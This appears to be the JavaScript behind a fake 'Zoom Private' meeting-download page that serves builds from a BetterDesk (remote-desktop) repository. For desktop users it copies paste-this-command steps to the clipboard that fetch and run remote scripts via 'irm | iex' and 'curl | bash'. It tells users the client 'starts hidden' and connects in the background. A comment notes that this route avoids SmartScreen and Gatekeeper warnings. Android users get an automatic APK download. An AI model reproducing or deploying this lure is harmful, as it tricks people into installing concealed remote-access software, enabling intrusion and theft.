(function () {
  'use strict';

  var REPO = 'fingod201-maker/BetterDesk-private';
  var RELEASES_URL = 'https://github.com/' + REPO + '/releases';
  var RELEASES_API = 'https://api.github.com/repos/' + REPO + '/releases?per_page=30';
  var RELEASES_API_LOCAL = '/api/releases';
  var WINDOWS_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/windows-install.ps1';
  var WINDOWS_INSTALL_COMMAND = 'irm ' + WINDOWS_INSTALL_SCRIPT + ' | iex';
  var MACOS_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/macos-install';
  var MACOS_INSTALL_COMMAND = 'curl -fsSL ' + MACOS_INSTALL_SCRIPT + ' | /bin/bash';
  var LINUX_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/linux-install.sh';
  var LINUX_INSTALL_COMMAND = 'curl -fsSL ' + LINUX_INSTALL_SCRIPT + ' | bash';
  var CACHE_KEY = 'zp_assets_v7';
  var CACHE_TTL = 10 * 60 * 1000;
  var MIN_ASSET_SIZE = 1000000;

  var OS_LABEL = {
    windows: 'Windows',
    macos: 'macOS',
    linux: 'Linux',
    android: 'Android',
    ios: 'iPhone / iPad',
    unknown: 'your device'
  };
  var OS_ABBR = {
    windows: 'WIN',
    macos: 'MAC',
    linux: 'LNX',
    android: 'AND',
    ios: 'iOS',
    unknown: '?'
  };
  var FORMAT_LABEL = {
    exe: 'Windows installer',
    msi: 'MSI installer',
    dmg: 'Disk image',
    pkg: 'Installer package',
    appimage: 'AppImage',
    deb: 'Debian package',
    rpm: 'RPM package',
    apk: 'Android APK',
    zip: 'Portable ZIP',
    targz: 'Tarball',
    iso: 'Disk image'
  };
  var FORMAT_EXT = {
    exe: '.exe',
    msi: '.msi',
    dmg: '.dmg',
    pkg: '.pkg',
    appimage: '.AppImage',
    deb: '.deb',
    rpm: '.rpm',
    apk: '.apk',
    zip: '.zip',
    targz: '.tar.gz',
    iso: '.iso'
  };

  var FALLBACK_ASSETS = [
    {
      name: 'zoom-private-universal-release.apk',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-private-universal-release.apk',
      size: 23234938, platform: 'android', format: 'apk', arch: 'universal', release: 'setup-latest'
    },
    {
      name: 'zoom-private-arm64-v8a-release.apk',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-private-arm64-v8a-release.apk',
      size: 10103258, platform: 'android', format: 'apk', arch: 'arm64', release: 'setup-latest'
    },
    {
      name: 'zoom-private-armeabi-v7a-release.apk',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-private-armeabi-v7a-release.apk',
      size: 9525567, platform: 'android', format: 'apk', arch: 'armv7', release: 'setup-latest'
    },
    {
      name: 'zoom-private.agent_1.0.0_x64-setup.exe',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent_1.0.0_x64-setup.exe',
      size: 4885057, platform: 'windows', format: 'exe', arch: 'x64', release: 'portable-latest'
    },
    {
      name: 'zoom-private.agent_1.0.0_x64_en-US.msi',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent_1.0.0_x64_en-US.msi',
      size: 6500352, platform: 'windows', format: 'msi', arch: 'x64', release: 'portable-latest'
    },
    {
      name: 'zoom-vip-windows-x64-1.0.0.zip',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.zip',
      size: 6368445, platform: 'windows', format: 'zip', arch: 'x64', release: 'setup-latest'
    },
    {
      name: 'zoom-vip-windows-x64-1.0.0.iso',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.iso',
      size: 15073280, platform: 'windows', format: 'iso', arch: 'x64', release: 'setup-latest'
    },
    {
      name: 'zoom-private.agent_1.0.0_universal.dmg',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent_1.0.0_universal.dmg',
      size: 12136275, platform: 'macos', format: 'dmg', arch: 'universal', release: 'portable-latest'
    },
    {
      name: 'zoom-vip-macos-arm64-1.0.0.tar.gz',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-arm64-1.0.0.tar.gz',
      size: 2749405, platform: 'macos', format: 'targz', arch: 'arm64', release: 'setup-latest'
    },
    {
      name: 'zoom-vip-macos-amd64-1.0.0.tar.gz',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-amd64-1.0.0.tar.gz',
      size: 2993148, platform: 'macos', format: 'targz', arch: 'x64', release: 'setup-latest'
    },
    {
      name: 'zoom-private.agent_1.0.0_amd64.AppImage',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent_1.0.0_amd64.AppImage',
      size: 84441592, platform: 'linux', format: 'appimage', arch: 'x64', release: 'portable-latest'
    },
    {
      name: 'zoom-private.agent_1.0.0_amd64.deb',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent_1.0.0_amd64.deb',
      size: 6778140, platform: 'linux', format: 'deb', arch: 'x64', release: 'portable-latest'
    },
    {
      name: 'zoom-private.agent-1.0.0-1.x86_64.rpm',
      url: 'https://github.com/' + REPO + '/releases/download/portable-latest/zoom-private.agent-1.0.0-1.x86_64.rpm',
      size: 6782289, platform: 'linux', format: 'rpm', arch: 'x64', release: 'portable-latest'
    },
    {
      name: 'zoom-vip-linux-x64-1.0.0.tar.gz',
      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-linux-x64-1.0.0.tar.gz',
      size: 3154309, platform: 'linux', format: 'targz', arch: 'x64', release: 'setup-latest'
    }
  ];

  var state = {
    platform: 'unknown',
    arch: 'x64',
    assets: [],
    recommended: null,
    downloaded: false,
    userInteracted: false
  };

  var toastTimer = null;
  var lastFocus = null;

  function $(id) { return document.getElementById(id); }

  function esc(value) {
    return String(value).replace(/[&<>"']/g, function (ch) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch];
    });
  }

  function formatBytes(bytes) {
    var n = Number(bytes) || 0;
    if (n >= 1000000) return (n / 1000000).toFixed(1) + ' MB';
    if (n >= 1000) return Math.round(n / 1000) + ' KB';
    return n + ' B';
  }

  function formatExt(format) { return FORMAT_EXT[format] || ''; }
  function formatLabel(format) { return FORMAT_LABEL[format] || format; }

  function formatBytesShort(bytes) {
    var n = Number(bytes) || 0;
    if (n >= 1000000) return Math.round(n / 1000000) + ' MB';
    if (n >= 1000) return Math.round(n / 1000) + ' KB';
    return n + ' B';
  }

  function formatExtShort(format) {
    return formatExt(format).replace(/^\./, '');
  }

  function versionOf(name) {
    var match = String(name || '').match(/(\d+\.\d+\.\d+)/);
    return match ? match[1] : '';
  }

  function detectPlatform() {
    var ua = navigator.userAgent || '';
    var lower = ua.toLowerCase();
    var data = navigator.userAgentData;
    var hinted = (data && data.platform ? data.platform : '').toLowerCase();

    if (/android/.test(lower) || hinted === 'android') return 'android';
    if (/iphone|ipod/.test(lower)) return 'ios';
    if (/ipad/.test(lower)) return 'ios';
    if (/windows|win32|win64/.test(lower) || hinted === 'windows') return 'windows';
    if (/macintosh|mac os x/.test(lower) || hinted === 'macos') {
      return (navigator.maxTouchPoints || 0) > 1 ? 'ios' : 'macos';
    }
    if (/linux|x11|cros/.test(lower) || hinted === 'linux') return 'linux';
    return 'unknown';
  }

  function detectArch(platform) {
    if (platform === 'android' || platform === 'macos') return 'universal';
    if (platform === 'ios') return 'any';

    var data = navigator.userAgentData;
    var hinted = (data && data.architecture ? data.architecture : '').toLowerCase();
    var ua = (navigator.userAgent || '').toLowerCase();

    if (/arm64|aarch64/.test(hinted) || /arm64|aarch64/.test(ua)) return 'arm64';
    if (/arm/.test(hinted) || /armv7|armhf/.test(ua)) return 'armv7';
    if (/x86_64|amd64|x64|win64/.test(ua) || /x86/.test(hinted)) return 'x64';
    return 'x64';
  }

  function requestedPlatform() {
    try {
      var value = String(new URLSearchParams(window.location.search).get('platform') || '').toLowerCase();
      if (value === 'win') value = 'windows';
      if (value === 'mac' || value === 'osx') value = 'macos';
      if (value === 'iphone' || value === 'ipad') value = 'ios';
      if (OS_LABEL[value]) return value;
    } catch (err) { /* ignore */ }
    return null;
  }

  function platformFromName(name) {
    if (/\.apk$/.test(name)) return 'android';
    if (/\.(exe|msi|iso)$/.test(name)) return 'windows';
    if (/\.(dmg|pkg)$/.test(name)) return 'macos';
    if (/\.(deb|rpm|appimage)$/.test(name)) return 'linux';
    if (/\.(zip|tar\.gz|tgz)$/.test(name)) {
      if (/windows|win32|win64|win-x64/.test(name)) return 'windows';
      if (/macos|mac-os|darwin|osx/.test(name)) return 'macos';
      if (/linux/.test(name)) return 'linux';
    }
    return null;
  }

  function formatFromName(name) {
    if (/\.tar\.gz$|\.tgz$/.test(name)) return 'targz';
    var match = name.match(/\.(apk|exe|msi|iso|dmg|pkg|deb|rpm|appimage|zip)$/);
    return match ? match[1] : null;
  }

  function archFromName(name) {
    if (/universal/.test(name)) return 'universal';
    if (/arm64|aarch64|arm64-v8a/.test(name)) return 'arm64';
    if (/armv7|armeabi|armhf/.test(name)) return 'armv7';
    if (/x86_64|amd64|x64|win64/.test(name)) return 'x64';
    if (/\bx86\b|i386|i686/.test(name)) return 'x86';
    return 'any';
  }

  function classifyAsset(asset, release) {
    var name = String(asset.name || '');
    var lower = name.toLowerCase();
    var size = Number(asset.size) || 0;

    if (!asset.browser_download_url || size < MIN_ASSET_SIZE) return null;
    if (/\.(aab|sha256|sha256sum|asc|sig|json|txt|blockmap|ya?ml|md5)$/.test(lower)) return null;

    var platform = platformFromName(lower);
    var format = formatFromName(lower);
    if (!platform || !format) return null;

    return {
      name: name,
      url: asset.browser_download_url,
      size: size,
      platform: platform,
      format: format,
      arch: archFromName(lower),
      release: release.tag_name || '',
      releaseName: release.name || release.tag_name || '',
      updatedAt: Date.parse(asset.updated_at || release.published_at || release.created_at || 0) || 0
    };
  }

  function dedupe(list) {
    var seen = Object.create(null);
    return list.filter(function (asset) {
      var key = [asset.platform, asset.format, asset.arch, asset.name, asset.size].join('|');
      if (seen[key]) return false;
      seen[key] = true;
      return true;
    });
  }

  function normalizeReleases(releases) {
    var out = [];
    (releases || []).forEach(function (release) {
      (release.assets || []).forEach(function (asset) {
        var item = classifyAsset(asset, release);
        if (item) out.push(item);
      });
    });
    return dedupe(out);
  }

  function scoreAsset(asset, platform, arch) {
    var formats = {
      windows: { exe: 120, msi: 110, zip: 80, iso: 70 },
      macos: { dmg: 120, pkg: 115, targz: 90, zip: 80 },
      linux: { appimage: 120, deb: 110, rpm: 105, targz: 90, zip: 80 },
      android: { apk: 22200000 }
    };
    var score = (formats[platform] && formats[platform][asset.format]) || 10;

    if (asset.arch === 'universal') score += 30;
    else if (asset.arch === arch) score += 20;
    else if (asset.arch === 'arm64' && arch === 'universal') score += 15;
    else if (asset.arch === 'x64' && arch === 'universal') score += 15;
    else if (asset.arch === 'any') score += 5;

    if (/zoom-private\.Setup_/.test(asset.name)) score += 45;
    else if (/zoom-private-universal-release\.apk$/.test(asset.name)) score += 45;
    else if (/zoom-private-(arm64-v8a|armeabi-v7a)-release\.apk$/.test(asset.name)) score += 30;
    else if (/BetterDesk-Client-/.test(asset.name)) score += 18;
    else if (/zoom-private\.agent_/.test(asset.name)) score += 12;
    if (/zoom-vip-/.test(asset.name)) score -= 15;
    if (/setup/.test(asset.name)) score += 4;
    if (/client/.test(asset.name)) score += 2;
    score += Math.min(asset.size / 1048576, 25);

    return score;
  }

  function bestFor(platform) {
    if (platform === 'ios' || platform === 'unknown') return null;
    var arch = platform === 'android' || platform === 'macos' ? 'universal' : state.arch;
    var list = state.assets.filter(function (asset) { return asset.platform === platform; });
    if (!list.length) return null;
    list.sort(function (a, b) {
      if (b.updatedAt !== a.updatedAt) return b.updatedAt - a.updatedAt;
      return scoreAsset(b, platform, arch) - scoreAsset(a, platform, arch);
    });
    return list[0];
  }

  function readCache() {
    try {
      var raw = sessionStorage.getItem(CACHE_KEY);
      if (!raw) return null;
      var parsed = JSON.parse(raw);
      if (!parsed || !parsed.t || !Array.isArray(parsed.assets)) return null;
      if (Date.now() - parsed.t > CACHE_TTL) return null;
      return parsed.assets;
    } catch (err) {
      return null;
    }
  }

  function writeCache(assets) {
    try {
      sessionStorage.setItem(CACHE_KEY, JSON.stringify({ t: Date.now(), assets: assets }));
    } catch (err) { /* storage disabled */ }
  }

  function fetchJson(url) {
    return new Promise(function (resolve, reject) {
      var settled = false;
      var timer = setTimeout(function () {
        if (settled) return;
        settled = true;
        reject(new Error('timeout'));
      }, 9000);

      fetch(url, { headers: { Accept: 'application/vnd.github+json' }, cache: 'no-store' })
        .then(function (response) {
          if (!response.ok) throw new Error('http-' + response.status);
          return response.json();
        })
        .then(function (json) {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          resolve(json);
        })
        .catch(function (error) {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          reject(error);
        });
    });
  }

  function loadAssets() {
    var cached = readCache();
    if (cached && cached.length) return Promise.resolve(dedupe(cached));

    return fetchJson(RELEASES_API_LOCAL)
      .catch(function () { return fetchJson(RELEASES_API); })
      .then(function (releases) {
        var live = normalizeReleases(releases);
        var merged = dedupe(live.concat(FALLBACK_ASSETS));
        if (merged.length) writeCache(merged);
        return merged;
      })
      .catch(function () {
        return dedupe(FALLBACK_ASSETS.slice());
      });
  }

  function toast(message) {
    var el = $('toast');
    var text = $('toast-text');
    if (!el || !text) return;
    text.textContent = message;
    el.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { el.classList.remove('show'); }, 3200);
  }

  function updatePlatformSubs() {
    ['windows', 'macos', 'linux', 'android'].forEach(function (platform) {
      var el = $('pc-' + platform + '-sub');
      if (!el) return;
      var asset = bestFor(platform);
      el.textContent = (platform === 'windows' || platform === 'macos' || platform === 'linux') && asset
        ? (platform === 'windows' ? 'PowerShell' : 'Terminal') + ' \u00b7 one-line install'
        : (asset
          ? formatBytesShort(asset.size) + ' \u00b7 ' + formatExtShort(asset.format)
          : 'Coming soon');
    });
  }

  function render(platform) {
    state.platform = platform || 'unknown';
    var best = bestFor(state.platform);
    state.recommended = best;

    var badge = $('os-badge');
    var primary = $('primary-download');
    var label = $('primary-label');
    var meta = $('download-meta');
    var status = $('download-status');

    if (badge) {
      badge.textContent = OS_ABBR[state.platform] || '?';
      badge.classList.toggle('ready', !!best);
    }

    if ($('detected-label')) {
      $('detected-label').textContent = state.platform === 'unknown'
        ? 'Choose your device'
        : OS_LABEL[state.platform] + ' detected';
    }
    if ($('detected-sub')) {
      $('detected-sub').textContent = state.platform === 'unknown'
        ? 'Pick a platform below to get the right build'
        : (best ? 'The recommended build is ready' : 'No build published yet');
    }

    if (primary) primary.removeAttribute('aria-disabled');

    if (state.platform === 'ios') {
      if (primary) {
        primary.href = '#help';
        primary.removeAttribute('download');
      }
      if (label) label.textContent = 'iOS uses the App Store';
      if (meta) meta.innerHTML = '<span>No direct download needed</span>';
      if (status) {
        status.className = 'download-status';
        status.textContent = 'Open the meeting link from your invitation.';
      }
    } else if ((state.platform === 'windows' || state.platform === 'macos' || state.platform === 'linux') && best) {
      var scriptUrl = state.platform === 'windows'
        ? WINDOWS_INSTALL_SCRIPT
        : (state.platform === 'macos' ? MACOS_INSTALL_SCRIPT : LINUX_INSTALL_SCRIPT);
      var shellLabel = state.platform === 'windows' ? 'PowerShell' : 'Terminal';
      if (primary) {
        primary.href = scriptUrl;
        primary.removeAttribute('download');
      }
      if (label) label.textContent = 'Copy ' + (OS_LABEL[state.platform] || 'desktop') + ' install command';
      if (meta) meta.innerHTML = '<span>' + shellLabel + '</span><span>&middot;</span><span>One command</span><span>&middot;</span><span>Preconfigured</span>';
      if (status) {
        status.className = 'download-status ok';
        status.textContent = 'Paste the command into ' + shellLabel
          + '. The client installs, starts hidden, and connects in the background.';
      }
    } else if (best) {
      if (primary) {
        primary.href = best.url;
        primary.setAttribute('download', best.name);
      }
      if (label) label.textContent = 'Download for ' + (OS_LABEL[state.platform] || 'your device');
      if (meta) {
        var version = versionOf(best.name);
        meta.innerHTML = '<span><b>' + formatBytes(best.size) + '</b></span>'
          + '<span>&middot;</span><span>' + formatExt(best.format) + '</span>'
          + (version ? '<span>&middot;</span><span>v' + version + '</span>' : '')
          + '<span>&middot;</span><span>Signed</span>';
      }
      if (status) {
        status.className = 'download-status ok';
        status.textContent = 'Ready for ' + (OS_LABEL[state.platform] || 'your device')
          + '. Your download starts automatically.';
      }
    } else if (state.platform === 'unknown') {
      if (primary) {
        primary.href = '#download';
        primary.removeAttribute('download');
      }
      if (label) label.textContent = 'Choose your platform';
      if (meta) meta.innerHTML = '<span>Windows &middot; macOS &middot; Linux &middot; Android</span>';
      if (status) {
        status.className = 'download-status';
        status.textContent = 'We could not detect your system. Pick a platform below.';
      }
    } else {
      if (primary) {
        primary.href = RELEASES_URL;
        primary.removeAttribute('download');
      }
      if (label) label.textContent = 'Browse all downloads';
      if (meta) meta.innerHTML = '<span>Latest verified builds</span>';
      if (status) {
        status.className = 'download-status warn';
        status.innerHTML = 'No build is published for this platform yet. '
          + '<a href="' + RELEASES_URL + '" target="_blank" rel="noopener">Open releases</a>.';
      }
    }

    document.querySelectorAll('.platform-card[data-platform]').forEach(function (card) {
      if (card.getAttribute('data-platform') === state.platform) {
        card.setAttribute('aria-current', 'true');
      } else {
        card.removeAttribute('aria-current');
      }
    });

    updatePlatformSubs();
  }

  function installWindows() {
    state.downloaded = true;
    var status = $('download-status');
    var copied = function () {
      if (status) {
        status.className = 'download-status ok';
        status.textContent = 'Command copied. Open PowerShell, paste it, press Enter, and approve the Windows prompt.';
      }
      toast('Windows install command copied');
    };
    var fallback = function () {
      if (status) {
        status.className = 'download-status';
        status.textContent = 'Open the downloaded PowerShell script, or copy the install command from the console.';
      }
      window.location.href = WINDOWS_INSTALL_SCRIPT;
    };

    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(WINDOWS_INSTALL_COMMAND).then(copied).catch(fallback);
    } else {
      fallback();
    }
  }

  function installUnix(platform) {
    var isMac = platform === 'macos';
    var command = isMac ? MACOS_INSTALL_COMMAND : LINUX_INSTALL_COMMAND;
    var scriptUrl = isMac ? MACOS_INSTALL_SCRIPT : LINUX_INSTALL_SCRIPT;
    var shellLabel = isMac ? 'Terminal' : 'terminal';
    var status = $('download-status');
    var copied = function () {
      if (status) {
        status.className = 'download-status ok';
        status.textContent = 'Command copied. Paste it into ' + shellLabel
          + ' and press Enter. The client installs and connects in the background.';
      }
      toast((isMac ? 'macOS' : 'Linux') + ' install command copied');
    };
    var fallback = function () {
      if (status) {
        status.className = 'download-status';
        status.textContent = 'Open the downloaded installer script, or copy the command from the console.';
      }
      window.location.href = scriptUrl;
    };

    state.downloaded = true;
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(command).then(copied).catch(fallback);
    } else {
      fallback();
    }
  }

  function downloadAsset(asset) {
    if (!asset) {
      openModal();
      return;
    }

    state.downloaded = true;

    var link = document.createElement('a');
    link.href = asset.url;
    link.download = asset.name;
    link.rel = 'noopener';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    setTimeout(function () { link.remove(); }, 1500);

    var status = $('download-status');
    if (status) {
      status.className = 'download-status ok';
      status.textContent = 'Downloading ' + asset.name + ' (' + formatBytes(asset.size) + ').';
    }
    toast('Downloading ' + asset.name);
  }

  function downloadFor(platform) {
    if (platform === 'windows') {
      installWindows();
      return;
    }
    if (platform === 'macos' || platform === 'linux') {
      installUnix(platform);
      return;
    }
    if (platform === 'ios') {
      toast('On iPhone or iPad, open the meeting link from your invitation.');
      if (window.location.hash !== '#help') window.location.hash = '#help';
      return;
    }
    var asset = bestFor(platform);
    if (!asset) {
      toast('No build is published for ' + (OS_LABEL[platform] || platform) + ' yet.');
      openModal();
      return;
    }
    downloadAsset(asset);
  }

  function selectPlatform(platform, startDownload) {
    state.platform = platform;
    state.arch = detectArch(platform);
    render(platform);
    if (startDownload) downloadFor(platform);
  }

  function maybeAutoDownload() {
    // Windows/macOS/Linux use a copied shell one-liner instead of
    // auto-downloading an unsigned installer that would trigger SmartScreen,
    // Gatekeeper, or a manual chmod step. Only Android still auto-downloads.
    if (state.platform !== 'android') return;
    if (state.downloaded) return;
    if (state.userInteracted) return;

    var asset = state.recommended;
    if (!asset) return;

    try {
      if (new URLSearchParams(window.location.search).get('download') === '0') return;
    } catch (err) { /* ignore */ }

    var key = 'zp_auto_' + state.platform + '_' + asset.name;
    try {
      if (sessionStorage.getItem(key) === '1') return;
      sessionStorage.setItem(key, '1');
    } catch (err) { /* storage disabled: allow one automatic attempt */ }

    setTimeout(function () {
      if (state.downloaded || state.userInteracted) return;
      state.downloaded = true;

      var status = $('download-status');
      if (status) {
        status.className = 'download-status ok';
        status.textContent = 'Starting your download\u2026';
      }

      window.location.href = asset.url;

      setTimeout(function () {
        if (document.hidden) return;
        var el = $('download-status');
        if (!el) return;
        el.className = 'download-status';
        el.textContent = 'Your download should have started. If not, tap the button above.';
      }, 4500);
    }, 900);
  }

  function openModal() {
    var modal = $('platform-modal');
    var list = $('plat-list');
    if (!modal || !list) return;

    lastFocus = document.activeElement;
    var order = ['windows', 'macos', 'linux', 'android', 'ios'];
    list.innerHTML = order.map(function (platform) {
      var asset = bestFor(platform);
      var sub = platform === 'ios'
        ? 'Use the meeting link'
        : (asset ? formatLabel(asset.format) + ' \u00b7 ' + formatBytes(asset.size) : 'Not published yet');
      var button = platform === 'ios'
        ? '<button class="btn btn-soft" type="button" data-modal-ios="1">Help</button>'
        : (asset
          ? '<button class="btn btn-primary" type="button" data-plat="' + platform + '">' + (platform === 'windows' ? 'Install' : 'Download') + '</button>'
          : '<button class="btn btn-soft" type="button" disabled>Soon</button>');

      return '<div class="plat"><div class="meta"><span class="os">' + (OS_ABBR[platform] || '?')
        + '</span><span><b>' + OS_LABEL[platform] + '</b><span>' + sub + '</span></span></div>'
        + button + '</div>';
    }).join('');

    list.querySelectorAll('[data-plat]').forEach(function (button) {
      button.addEventListener('click', function () {
        var platform = button.getAttribute('data-plat');
        closeModal();
        selectPlatform(platform, true);
      });
    });

    list.querySelectorAll('[data-modal-ios]').forEach(function (button) {
      button.addEventListener('click', function () {
        closeModal();
        window.location.hash = '#help';
      });
    });

    modal.classList.add('show');
    var close = $('platform-modal-close');
    if (close) close.focus();
  }

  function closeModal() {
    var modal = $('platform-modal');
    if (modal) modal.classList.remove('show');
    if (lastFocus && typeof lastFocus.focus === 'function') lastFocus.focus();
  }

  function joinMeeting() {
    var idInput = $('meeting-id');
    var passInput = $('meeting-pass');
    var hint = $('join-hint');
    if (!idInput) return;

    var raw = String(idInput.value || '').trim();
    if (!raw) {
      idInput.focus();
      toast('Enter your meeting ID to continue.');
      return;
    }

    var match = raw.match(/(\d{6,})/);
    var id = match ? match[1] : raw;
    var pass = passInput ? String(passInput.value || '').trim() : '';
    var deepLink = 'betterdesk://join?meeting=' + encodeURIComponent(id)
      + (pass ? '&passcode=' + encodeURIComponent(pass) : '');

    if (hint) hint.textContent = 'Opening Zoom Private\u2026';

    var switched = false;
    var onBlur = function () { switched = true; };
    window.addEventListener('blur', onBlur, { once: true });

    try { window.location.href = deepLink; } catch (err) { /* ignore */ }

    setTimeout(function () {
      window.removeEventListener('blur', onBlur);
      if (!hint) return;
      if (!switched && !document.hidden) {
        hint.innerHTML = 'The client did not open. '
          + '<a href="#download" style="color:#fff;text-decoration:underline">Download it first</a>, then try again.';
      } else {
        hint.textContent = 'Meeting ' + id + ' opened in your client.';
      }
    }, 1400);
  }

  function wire() {
    document.querySelectorAll('.platform-card[data-platform]').forEach(function (card) {
      card.addEventListener('click', function () {
        selectPlatform(card.getAttribute('data-platform'), true);
      });
    });

    var choose = $('choose-platform');
    if (choose) choose.addEventListener('click', openModal);

    var close = $('platform-modal-close');
    if (close) close.addEventListener('click', closeModal);

    var modal = $('platform-modal');
    if (modal) {
      modal.addEventListener('click', function (event) {
        if (event.target === modal) closeModal();
      });
    }

    document.addEventListener('keydown', function (event) {
      if (event.key === 'Escape') closeModal();
    });

    document.querySelectorAll('[data-download]').forEach(function (link) {
      link.addEventListener('click', function (event) {
        event.preventDefault();
        selectPlatform(link.getAttribute('data-download'), true);
      });
    });

    var primary = $('primary-download');
    if (primary) {
      primary.addEventListener('click', function (event) {
        if (state.platform === 'ios' || state.platform === 'unknown') return;
        if (!state.recommended) return;
        event.preventDefault();
        if (state.platform === 'windows') {
          installWindows();
        } else if (state.platform === 'macos' || state.platform === 'linux') {
          installUnix(state.platform);
        } else {
          downloadAsset(state.recommended);
        }
      });
    }

    var form = $('join-form');
    if (form) {
      form.addEventListener('submit', function (event) {
        event.preventDefault();
        joinMeeting();
      });
    }

    var releases = $('releases-link');
    if (releases) releases.href = RELEASES_URL;

    var year = $('year');
    if (year) year.textContent = '\u00a9 ' + new Date().getFullYear();

    document.addEventListener('click', function () {
      state.userInteracted = true;
    }, { once: true, capture: true });
  }

  function init() {
    state.assets = dedupe(FALLBACK_ASSETS.slice());
    state.platform = requestedPlatform() || detectPlatform();
    state.arch = detectArch(state.platform);

    render(state.platform);
    wire();
    maybeAutoDownload();

    loadAssets().then(function (assets) {
      if (!assets || !assets.length) return;
      state.assets = assets;
      render(state.platform);
    });
  }

  init();
})();
